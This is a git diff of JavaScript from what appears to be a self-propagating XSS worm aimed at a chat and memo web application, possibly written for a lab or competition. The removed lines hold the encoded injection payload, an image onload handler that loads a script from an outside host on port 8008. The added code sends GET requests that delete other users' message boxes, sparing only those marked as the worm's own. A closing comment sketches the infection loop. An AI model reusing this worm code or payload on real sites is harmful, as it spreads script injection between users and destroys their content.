@@ -18,17 +18,29 @@ console.log('still works');
     x.send('name=&message=' + encodeURIComponent(payload) + '&key=SusiAndPinhead4EverAndEverAndEver&sendto_me=absenden');
 })();
 
-//req orig ff:
-//name=&message=%5Cu003cimg+src%3D%5Cu0022data%3Aimage%2Fgif%3Bbase64%2CR0lGODlhAQABAIAAAAAAAP%2F%2F%2FyH5BAEAAAAALAAAAAABAAEAAAIBRAA7%5Cu0022+onload%3D%5Cu0022script+%3D+document.createElement%28%27script%27%29%3Bscript.src+%3D%27http%3A%2F%2Fpfefferle.online%3A8008%2Ff.js%27%3Bdocument.head.appendChild%28script%29%3B%5Cu0022%5Cu003e&key=SusiAndPinhead4EverAndEverAndEver&sendto_me=absenden
-
-/*req :
-name=
-    &message=%5Cu003cimg+src%3D%5Cu0022data%3Aimage%2Fgif%3Bbase64%2CR0lGODlhAQABAIAAAAAAAP%2F%2F%2FyH5BAEAAAAALAAAAAABAAEAAAIBRAA7%5Cu0022+onload%3D%5Cu0022script+%3D+document.createElement%28%27script%27%29%3Bscript.src+%3D%27http%3A%2F%2Fpfefferle.online%3A8008%2Ff.js%27%3Bdocument.head.appendChild%28script%29%3B%5Cu0022%5Cu003e
-    &key=SusiAndPinhead4EverAndEverAndEver
-    &sendto_me=absenden
-
-req xhr:
-key=SusiAndPinhead4EverAndEverAndEver&message=%3Cimg%2Bsrc%3D%22data%3Aimage%2Fgif%3Bbase64%2CR0lGODlhAQABAIAAAAAAAP%2F%2F%2FyH5BAEAAAAALAAAAAABAAEAAAIBRAA7%22%2Bonload%3D%22script%2B%3D%2Bdocument.createElement('script')%3Bscript.src%2B%3D'http%3A%2F%2Fpfefferle.online%3A8008%2Ff.js'%3Bdocument.head.appendChild(script)%3B%22%3E&name=sendto_me=absenden
-*/
+// hide boxes
+(function(){ // anonyme, selbstausführende Funktion
+    var btns = document.getElementsByClassName("closebtn");
+    for (var i = 0; i < btns.length; i++) {
+        // works //  console.log(i);
+        var div=btns[i].parentNode.getElementsByTagName('div');
+        if (div.length != 1){
+            console.log('WTF: div.length='+div.length+' of btns['+i+'] should be 1');
+        }
+        console.log('A');
+        if (div[0].innerText == '4242'){ // if true div is from own worm.
+            console.log('B innner='+div[0].innerText);
+            // don't delete
+        } else {
+            console.log('D');
+            var x = new XMLHttpRequest();
+            x.open('GET', btns[i].href);
+            console.log(btns[i].href);
+            x.send();
+            //    btns[i].href //full url
+            //    btns[i].getAttribute('href') //without base
+        }
+    }
+})();
 
 // inj -> chat -> memo -> läd bei aufruf ext script -> inj -> chat -> memo -> läd
